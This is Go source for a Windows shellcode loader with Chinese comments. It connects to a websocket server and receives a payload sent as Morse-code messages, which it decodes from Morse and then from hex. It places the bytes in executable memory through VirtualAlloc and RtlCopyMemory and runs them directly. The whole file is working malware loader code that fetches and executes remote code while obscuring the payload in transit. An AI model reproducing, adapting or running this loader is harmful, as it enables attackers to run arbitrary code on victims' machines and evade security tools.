package main

import (
	"encoding/hex"
	"fmt"
	"github.com/gorilla/websocket" //这里使用的是 gorilla 的 websocket 库
	"log"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 区域可以执行代码，应用程序可以读写该区域。
)

var pay string
var url = "ws://127.0.0.1:8080/socket" //写入服务端ip与端口
var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   // kernel32.dll它控制着系统的内存管理、数据的输入输出操作和中断处理
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      // ntdll.dll描述了windows本地NTAPI的接口
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") // VirtualAlloc申请内存空间
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   // RtlCopyMemory非重叠内存区域的复制
)
var morseMap = map[string]string{
	"a": ".-",
	"b": "-...",
	"c": "-.-.",
	"d": "-..",
	"e": ".",
	"f": "..-.",
	"g": "--.",
	"h": "....",
	"i": "..",
	"j": ".---",
	"k": "-.-",
	"l": ".-..",
	"m": "--",
	"n": "-.",
	"o": "---",
	"p": ".--.",
	"q": "--.-",
	"r": ".-.",
	"s": "...",
	"t": "-",
	"u": "..-",
	"v": "...-",
	"w": ".--",
	"x": "-..-",
	"y": "-.--",
	"z": "--..",
	"1": ".----",
	"2": "..---",
	"3": "...--",
	"4": "....-",
	"5": ".....",
	"6": "-....",
	"7": "--...",
	"8": "---..",
	"9": "----.",
	"0": "-----",
}

func MosJe(str string) (key string, err error) {
	for key, v := range morseMap {
		if v == str {
			return key, err
		}
	}
	return "", err
}

func main() {
	dialer := websocket.Dialer{}
	connect, _, err := dialer.Dial(url, nil)
	if nil != err {
		log.Println(err)
		return
	}
	defer connect.Close()

	for {

		messageType, messageData, err := connect.ReadMessage()
		if nil != err {
			break
		}
		switch messageType {
		case websocket.TextMessage: //文本数据
			tmp, _ := MosJe(string(messageData))
			pay = pay + tmp
			fmt.Printf(string(messageData) + "\r")
		default:
		}
	}
	maxDeLen := hex.DecodedLen(len([]byte(pay)))
	dst2 := make([]byte, maxDeLen)
	_, err = hex.Decode(dst2, []byte(pay))
	xor_shellcode := dst2
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(xor_shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) // 为shellcode申请内存空间
	if err != nil && err.Error() != "The operation completed successfully." {
	}

	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&xor_shellcode[0])), uintptr(len(xor_shellcode))) // 将shellcode内存复制到申请出来的内存空间中
	if err != nil && err.Error() != "The operation completed successfully." {
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}
